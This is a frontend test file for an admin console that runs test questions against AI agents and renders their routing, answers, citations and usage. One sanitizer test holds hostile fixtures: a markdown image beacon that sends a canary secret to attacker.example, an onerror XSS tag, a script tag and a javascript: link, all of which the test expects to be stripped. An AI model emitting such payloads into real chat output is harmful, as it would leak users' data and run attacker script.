import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { emptyAgentForm, type AgentTestResult } from "@/lib/admin/agents";

import { AgentTestConsole, TestResultView } from "./agent-test-console";

const result = (overrides: Partial<AgentTestResult> = {}): AgentTestResult => ({
  routing: {
    mode: "single",
    agents: [{ key: "legal", name: "Legal agent", goal: "Who signs an 80,000 euro supplier contract?" }],
    routed_by: "planner",
    reason: "The planner chose by the agents' descriptions.",
    tested_agent_picked: true,
  },
  answer: {
    agent: "legal",
    goal: "Who signs an 80,000 euro supplier contract?",
    text: "The CFO signs it [S1].",
    citations: [
      {
        marker: "S1",
        document_id: "d1",
        title: "Contract Signature Authority Matrix",
        filename: "contract-signature-authority-matrix.xlsx",
        section: "Signature authority",
        page: null,
        trust: "official",
      },
    ],
    usage: { calls: 4, input_tokens: 3120, output_tokens: 410, cost_usd: 0.0042, models: ["claude-sonnet-5-5"] },
    steps: [
      { kind: "search", detail: "Who signs an 80,000 euro supplier contract?", ok: true, error: null },
      { kind: "tool", detail: "draft_email", ok: false, error: "limit_reached" },
    ],
    abstained: false,
    withheld: 0,
    error: null,
  },
  ...overrides,
});

describe("TestResultView", () => {
  it("shows who the planner picked and why, then the answer with citations, steps and cost", () => {
    const html = renderToStaticMarkup(<TestResultView result={result()} question="Can I sign an 80k supplier deal?" />);
    expect(html).toContain("<strong>Legal agent</strong>");
    expect(html).toContain("Decided by the planner. The planner chose by the agents&#x27; descriptions.");
    expect(html).toContain("Who signs an 80,000 euro supplier contract?"); // the planner's goal
    expect(html).toContain("The CFO signs it");
    expect(html).toContain('aria-label="Source 1: Contract Signature Authority Matrix"'); // [S1] is a chip
    expect(html).toContain("Contract Signature Authority Matrix");
    expect(html).toContain("Tried draft_email: over the tool-call limit, not run");
    expect(html).toContain("4 calls · 3,120 in · 410 out · $0.004 · claude-sonnet-5-5");
    expect(html).toMatch(/<h4 id="test-routing-heading"/);
    expect(html).toContain('aria-labelledby="test-answer-heading"');
  });

  it("renders the answer as markdown, like the chat: lists, emphasis, tables and citation chips", () => {
    const formatted = result();
    formatted.answer = {
      ...formatted.answer!,
      text: "Who signs:\n\n- **Up to 25,000 euros:** the department manager [S1]\n- Above: the CFO\n\n| Value | Signs |\n| --- | --- |\n| 80,000 | CFO |",
    };
    const html = renderToStaticMarkup(<TestResultView result={formatted} question="q" />);
    expect(html).toMatch(/<ul[^>]*>\s*<li[^>]*><strong>Up to 25,000 euros:<\/strong>/);
    expect(html).toContain("<table");
    expect(html).toMatch(/<button type="button"[^>]*aria-label="Source 1: Contract Signature Authority Matrix"/);
    expect(html).not.toContain("**");
    // The chip points at the citation entry, which can take focus.
    expect(html).toMatch(/<li id="[^"]+-S1" tabindex="-1"/);
  });

  it("applies the chat's safety rules: no image is loaded, no raw HTML, no javascript: links, links open safely", () => {
    const hostile = result();
    hostile.answer = {
      ...hostile.answer!,
      text:
        "Done [S1].\n\n![receipt](https://attacker.example/p?d=CANARY-SECRET)\n\n" +
        '<img src=x onerror="alert(1)"><script>alert(2)</script>\n\n' +
        "[open](javascript:alert(3)) and [the matrix](https://intranet.example/legal)",
    };
    const html = renderToStaticMarkup(<TestResultView result={hostile} question="q" />);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).not.toContain("CANARY-SECRET");
    expect(html).toContain("[receipt]"); // only the alt text
    expect(html).not.toContain("<script");
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("javascript:");
    expect(html).toContain('href="https://intranet.example/legal"');
    expect(html).toContain('target="_blank" rel="noopener noreferrer nofollow"');
  });

  it("says when the planner did not pick the tested agent", () => {
    const missed = result();
    missed.routing = { ...missed.routing, agents: [{ key: "hr", name: "HR agent", goal: "q" }], tested_agent_picked: false };
    const html = renderToStaticMarkup(<TestResultView result={missed} question="q" />);
    expect(html).toContain("<strong>HR agent</strong>");
    expect(html).toContain("The planner did not pick this agent for this question.");
  });

  it("explains an abstention, an agent error and a routing-only run", () => {
    const empty = result();
    empty.answer = { ...empty.answer!, text: "I couldn't find this.", citations: [], abstained: true };
    expect(renderToStaticMarkup(<TestResultView result={empty} question="q" />)).toContain(
      "Nothing in its collections that you can see answers this.",
    );
    const failed = result();
    failed.answer = { ...failed.answer!, error: "model unavailable: system:x" };
    expect(renderToStaticMarkup(<TestResultView result={failed} question="q" />)).toContain(
      "The agent could not answer: model unavailable: system:x",
    );
    const routingOnly = renderToStaticMarkup(
      <TestResultView result={result({ answer: null, routing: { ...result().routing, mode: "direct", agents: [] } })} question="q" />,
    );
    expect(routingOnly).toContain("No agent: the assistant answers directly");
    expect(routingOnly).toContain("No answer: no agent was tested.");
  });
});

describe("AgentTestConsole", () => {
  it("has a labelled question box, a disabled run button until there is a question, and a live region", () => {
    const html = renderToStaticMarkup(<AgentTestConsole form={emptyAgentForm()} savedKey={null} formInvalid={false} />);
    expect(html).toMatch(/<label[^>]*for="([^"]+)"[^>]*>Question<\/label><textarea[^>]*id="\1"/);
    expect(html).toMatch(/<button[^>]*type="button"[^>]*disabled=""[^>]*>Run test<\/button>/);
    expect(html).toContain('aria-live="polite"');
    expect(html).not.toContain("<form"); // it sits inside the editor's form
  });

  it("asks to fix the definition first when it is invalid", () => {
    const html = renderToStaticMarkup(<AgentTestConsole form={emptyAgentForm()} savedKey="legal" formInvalid />);
    expect(html).toContain("Fix the highlighted fields in Definition first.");
  });
});
